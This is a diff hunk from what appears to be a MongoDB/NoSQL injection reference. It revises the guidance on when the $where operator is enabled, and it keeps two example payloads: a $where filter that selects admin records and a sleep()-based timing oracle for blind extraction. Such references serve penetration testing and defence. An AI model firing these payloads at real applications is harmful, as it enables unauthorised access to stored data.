@@ -91,7 +91,7 @@ Binary search the character space to minimize requests. Works on any string fiel
 
 ### `$where` JavaScript Injection
 
-If `$where` operator is enabled (disabled by default in MongoDB 7.0+; MongoDB 4.4–6.x deprecated it but left `javascriptEnabled` defaulting to `true`), inject arbitrary server-side JavaScript:
+If `$where` is enabled, inject server-side JavaScript. Inspect `security.javascriptEnabled` / `--noscripting`, managed-service restrictions, and the installed engine version. Verify operator availability, defaults, and supported functions against that build's documentation or controlled probes; deprecation alone does not mean execution is disabled ([MongoDB documentation](https://www.mongodb.com/docs/manual/reference/operator/query/where/)):
 ```json
 {"$where": "function(){return this.role == 'admin'}"}                          // direct filter — returns matching documents
 {"$where": "function(){return this.username == 'admin' && sleep(2000)}"}       // timing oracle only — sleep() returns undefined (falsy), so no documents are returned; observe latency
